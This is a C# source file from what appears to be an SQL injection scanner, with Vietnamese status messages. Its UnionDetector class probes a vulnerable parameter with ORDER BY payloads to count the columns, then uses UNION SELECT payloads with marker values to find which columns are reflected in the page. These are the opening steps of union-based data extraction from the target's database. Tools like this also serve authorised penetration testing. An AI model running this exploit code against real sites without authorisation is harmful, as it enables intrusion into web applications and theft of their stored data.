using SQLiScanner.Models;
using SQLiScanner.Models.Enums;
using SQLiScanner.Services;
using SQLiScanner.Utility;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace SQLiScanner.Modules
{
    public class UnionDetector
    {
        private readonly IRequestDispatcher _requestService;
        public UnionDetector(IRequestDispatcher requestService)
        {
            _requestService = requestService;
        }

        public async Task<int> GetColumnCountAsync(
            CrawlResult target, 
            AnalyzingResult detectedData, 
            PayloadState trackingState,
            CancellationToken cancellationToken = default)
        {
            trackingState.UpdateStatus(ScanStatus.CheckingColumnCount, "Đang dò số cột bằng ORDER BY...");

            string originalValue = target.Params.TryGetValue(detectedData.VulnerableParam, out var bodyVal)
                ? bodyVal
                : (System.Web.HttpUtility.ParseQueryString(target.RawQueryString)[detectedData.VulnerableParam] ?? "");

            int baseLength = await GetResponseLengthAsync(target, originalValue, detectedData.Route, cancellationToken);

            if (baseLength <= 0) return -1;

            double columnErrorThreshold = target.PageTolerance * 4.0;
            if (columnErrorThreshold < 0.15) columnErrorThreshold = 0.15;
            if (columnErrorThreshold > 0.40) columnErrorThreshold = 0.40;

            for (int i = 1; i <= 50; i++)
            {
                string payload = $"{originalValue}{detectedData.WorkingPrefix} ORDER BY {i}{detectedData.WorkingSuffix}";
                int currentLength = await GetResponseLengthAsync(target, payload, detectedData.Route, cancellationToken);

                bool isError = Math.Abs(currentLength - baseLength) > baseLength * columnErrorThreshold;

                if (isError)
                {
                    if (i == 1) return -1;
                    return i - 1;
                }
                else
                {
                    trackingState.UpdateStatus(ScanStatus.CheckingColumnCount, $"Đang dò cột thứ {i}...");
                }
            }

            return -1;
        }

        public async Task<List<int>> GetVisibleColumnsAsync(
            CrawlResult target, 
            AnalyzingResult detectedData, 
            int colCount,
            PayloadState trackingState,
            CancellationToken cancellationToken = default)
        {
            trackingState.UpdateStatus(ScanStatus.ExploitingData, $"Đang tìm cột Text trong {colCount} cột...");
            List<int> visibleCols = new List<int>();
            string fromTable = detectedData.DatabaseType == DatabaseType.Oracle ? " FROM DUAL" : "";

            string originalValue = target.Params.TryGetValue(detectedData.VulnerableParam, out var bodyVal)
                ? bodyVal
                : (System.Web.HttpUtility.ParseQueryString(target.RawQueryString)[detectedData.VulnerableParam] ?? "");

            string[] payloadParts = new string[colCount];
            for (int i = 0; i < colCount; i++)
            {
                trackingState.UpdateStatus(ScanStatus.ExploitingData, $"Đang thử inject cột {i + 1}/{colCount}...");
                for (int j = 0; j < colCount; j++) payloadParts[j] = "NULL";

                string magicTag = $"99{i + 1:D2}"; // VD: 9901
                payloadParts[i] = $"'{magicTag}'";

                string unionPart = string.Join(",", payloadParts);
                string payload = $"{originalValue}{detectedData.WorkingPrefix} AND 1=0 UNION SELECT {unionPart}{fromTable}{detectedData.WorkingSuffix}";

                try
                {
                    // Ở đây ta cần HTML string để tìm text '9901'
                    string? html = await SendPayloadGetStringAsync(target, payload, detectedData.Route, cancellationToken);

                    if (!string.IsNullOrEmpty(html) && html.Contains(magicTag))
                    {
                        visibleCols.Add(i + 1);
                    }
                }
                catch {}
            }

            return visibleCols;
        }

        #region Các hàm phụ trợ
        private async Task<int> GetResponseLengthAsync(
            CrawlResult target, string payload, InjectionRoute route, CancellationToken cancellationToken = default)
        {
            try
            {
                var response = await _requestService.RequestAsync(target, payload, route, cancellationToken);
                return response.Bytes == null ? -1 : response.Bytes.Length;
            }
            catch { return -1; }
        }

      
        private async Task<string?> SendPayloadGetStringAsync(
            CrawlResult target, string payload, InjectionRoute route, CancellationToken cancellationToken = default)
        {
            try
            {
                var response = await _requestService.RequestAsync(target, payload, route, cancellationToken);
                return response.Bytes == null ? "" : System.Text.Encoding.UTF8.GetString(response.Bytes);
            }
            catch { return ""; }
        }
        #endregion
    }
}